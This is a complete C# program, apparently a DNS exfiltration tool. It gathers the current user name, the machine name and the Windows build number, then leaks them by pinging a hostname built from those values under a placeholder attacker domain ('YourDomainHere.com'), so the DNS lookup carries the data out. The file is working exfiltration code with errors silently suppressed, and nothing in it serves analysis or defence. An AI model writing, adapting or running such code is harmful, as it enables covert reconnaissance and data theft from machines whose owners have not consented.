using System;
using Microsoft.Win32;
using System.Net.NetworkInformation;
using System.Text;

namespace DNSExfil
{
    class Program
    {

        public static void gatherAndSendInfo()
        {
            string hostname = System.Environment.MachineName;
            string user = Environment.UserName;
            string osV = Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion", "CurrentBuild", "").ToString();
            // Microsoft.Win32.Registry was imported via Visual Studio's Project > Manage NuGet Packages > Search: Microsoft.Win32.Registry
            Ping pingSender = new Ping();
            string pingMe = user + '.' + hostname + '.' + osV + ".dnsexfil.YourDomainHere.com";
            int timeout = 0;
            PingOptions options = new PingOptions(64, true);
            string data = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";
            byte[] buffer = Encoding.ASCII.GetBytes(data);
            try
            {
                PingReply reply = pingSender.Send(pingMe, timeout, buffer, options);
            }
            catch
            {

            }

            
        }

        static void Main(string[] args)
        {
            gatherAndSendInfo();
        }
    }
}
